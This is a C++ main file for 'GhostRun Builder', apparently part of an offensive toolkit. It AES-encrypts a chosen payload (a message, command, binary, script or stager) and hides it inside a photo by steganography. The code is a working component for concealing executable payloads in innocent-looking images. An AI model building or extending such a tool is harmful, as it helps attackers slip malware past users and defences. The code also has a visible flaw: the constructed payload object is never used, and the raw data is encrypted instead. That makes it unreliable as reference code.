#include <iostream>
#include <vector>
#include <aes/aes.hpp>
#include <cstring>
#include <filesystem>
#include <steg/steg.hpp>
#include <utils/utils.hpp>
#include <payload/payload.hpp>

int main(int argc, char* argv[])
{
    //argv[0] = . | argv[1] = payload type | argv[2] = payload data | argv[3] = original photo path | argv[4] = output photo path
    std::cout << "GhostRun Builder" << std::endl;
    if (argc != 5)
    {
        std::cout << "Wrong Usage!" << std::endl << "Try: " << argv[0] << " <Type> <Data> <OriginalPhotoPath> <NewPhotoPath>" << std::endl;
        std::cout << "Examples: " << std::endl;
        std::cout << "./GhostRunBuilder message \"this is a secret message\" photo.png output.png" << std::endl;
        return 1;
    }
    if (!std::filesystem::exists(argv[3]))
    {
        std::cout << "File does not exist: " << argv[3] << std::endl;
        return 1;
    }

    auto it = stringToPayloadType.find(argv[1]);
    if (it == stringToPayloadType.end())
    {
        std::cout << "Unknown payload type: " << argv[1] << std::endl;
        std::cout << "Valid types: message, command, binary, script, stager" << std::endl;
        return 1;
    }

    PayloadType payloadType = it->second;

    std::vector<uint8_t> data(argv[2], argv[2] + strlen(argv[2])); //Data is being recieved as a c string, cant use argv[2].end()

    Payload payload = createPayload(payloadType, data);

    const char *originalImagePath = argv[3];
    const char *newImagePath = argv[4];

    try
    {
        encryptedDataStruct encryptedData = encryptDataAes(data, AES_KEY);
        //When embedding the struct into the image, We firstly have to serialize it and turn it into raw bytes (Need a way to represent it as such).
        std::vector<uint8_t> encryptedDataRawBytes = serialize(encryptedData);

        embedData(encryptedDataRawBytes, originalImagePath, newImagePath);//
    }
    catch (std::exception &e)
    {
        std::cout << "Exception: " << e.what() << std::endl;
        return 1;
    }
    std::cout << "Success!" << std::endl;
    std::cout << "New image now at: " << newImagePath << std::endl;
    return 0;
}
